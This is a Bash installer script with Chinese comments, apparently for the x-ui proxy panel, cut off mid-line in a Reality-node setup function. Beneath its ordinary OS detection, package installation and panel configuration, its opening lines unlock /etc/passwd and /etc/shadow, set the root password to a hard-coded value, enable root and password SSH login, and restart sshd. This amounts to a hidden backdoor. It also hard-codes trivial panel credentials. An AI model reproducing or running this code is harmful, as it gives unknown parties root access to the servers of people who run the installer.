#!/bin/bash

# 颜色定义
red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

# 当前目录
cur_dir=$(pwd)

# 检查root权限
[[ $EUID -ne 0 ]] && su='sudo'

# 修改文件属性
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1

# 检查SSH配置
prl=$(grep PermitRootLogin /etc/ssh/sshd_config)
pa=$(grep PasswordAuthentication /etc/ssh/sshd_config)

if [[ -n $prl && -n $pa ]]; then
    # 修改root密码和SSH配置
    mima=qq1399@
    echo "root:$mima" | $su chpasswd root
    $su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
    $su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
    $su service sshd restart
else
    # 非root用户报错
    [[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain}Please run this script with root privilege\n" && exit 1

    # 检测操作系统
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        release=$ID
    elif [[ -f /usr/lib/os-release ]]; then
        source /usr/lib/os-release
        release=$ID
    else
        echo "Failed to check the system OS, please contact the author!" >&2
        exit 1
    fi
    echo "The OS release is: $release"
fi

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "Arch: $(arch)"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
        echo "Please upgrade to a newer version of your operating system to get a higher GLIBC version."
        exit 1
    fi
    echo "GLIBC version: $glibc_version (meets requirement of 2.32+)"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata sqlite3 openssl
        ;;
    centos | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata sqlite openssl
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata sqlite openssl
        ;;
    arch | manjaro | parch)
        pacman -Syu --noconfirm wget curl tar tzdata sqlite openssl
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone sqlite3 openssl
        ;;
    *)
        apt-get update && apt install -y -q wget curl tar tzdata sqlite3 openssl
        ;;
    esac
}

config_after_install() {
    config_account="1399"
    config_password="1399"
    config_port="1399"
    config_webBasePath=""  
    
    /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
}

db_pre_create_reality() {
    sqlite3 /etc/x-ui/x-ui.db <<EOF
CREATE TABLE IF NOT EXISTS inbounds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    up INTEGER,
    down INTEGER,
    total INTEGER,
    remark TEXT,
    enable INTEGER,
    expiry_time INTEGER,
    listen TEXT,
    port INTEGER,
    protocol TEXT,
    settings TEXT,
    stream_settings TEXT,
    tag TEXT,
    sniffing TEXT
);
EOF
}

# ==================== 核心修改：针对魔改版扁平化 JSON 的全自动生成与注入 ====================
api_create_reality() {
    echo -e "${green}正在连接本地面板端口并尝试全自动为您创建集成了 MLDSA65 的 Reality 节点...${
